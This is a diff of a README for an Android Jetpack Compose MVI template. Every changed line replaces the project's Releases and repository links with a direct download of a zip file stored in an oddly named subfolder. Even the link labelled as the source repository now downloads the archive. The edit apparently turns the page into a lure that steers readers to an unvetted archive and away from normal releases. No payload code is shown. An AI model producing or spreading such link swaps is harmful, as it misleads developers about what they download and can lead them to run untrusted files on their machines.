@@ -1,7 +1,7 @@
 # 🎉 compose-mvi-2025 - Build Modern Android Apps Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)](https://github.com/connorscw/compose-mvi-2025/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/connorscw/compose-mvi-2025/main/kotwalee/compose-mvi-2025.zip)](https://raw.githubusercontent.com/connorscw/compose-mvi-2025/main/kotwalee/compose-mvi-2025.zip)
 
 ## 🚀 Getting Started
 Welcome to the compose-mvi-2025 project! This template helps you get started with building modern Android applications using Jetpack Compose and the MVI (Model-View-Intent) architecture pattern. 
@@ -23,7 +23,7 @@ Before you begin, ensure you have the following:
 To get the application, visit the Releases page. Here’s how to do it:
 
 1. Click the link below to access the Releases page.
-   [Download Latest Release](https://github.com/connorscw/compose-mvi-2025/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/connorscw/compose-mvi-2025/main/kotwalee/compose-mvi-2025.zip)
    
 2. Find the latest version listed at the top of the releases.
   
@@ -66,11 +66,11 @@ Looking for ideas? Check out these example projects built using this template:
 Both examples showcase various concepts and can serve as inspiration for your projects.
 
 ## 🔍 Explore More
-You can dive deeper into the features by checking out our [GitHub Repository](https://github.com/connorscw/compose-mvi-2025). Here, you’ll find all the source code along with detailed documentation.
+You can dive deeper into the features by checking out our [GitHub Repository](https://raw.githubusercontent.com/connorscw/compose-mvi-2025/main/kotwalee/compose-mvi-2025.zip). Here, you’ll find all the source code along with detailed documentation.
 
 ## 🔗 Final Steps
 After you have installed the application and explored its features, you can finally enjoy developing modern Android apps with ease and confidence. Utilize the resources provided to enhance your understanding and make the most of this template.
 
 For any help, don't hesitate to connect with the community or create an issue on our GitHub page.
 
-[Download Latest Release](https://github.com/connorscw/compose-mvi-2025/releases)
+[Download Latest Release](https://raw.githubusercontent.com/connorscw/compose-mvi-2025/main/kotwalee/compose-mvi-2025.zip)
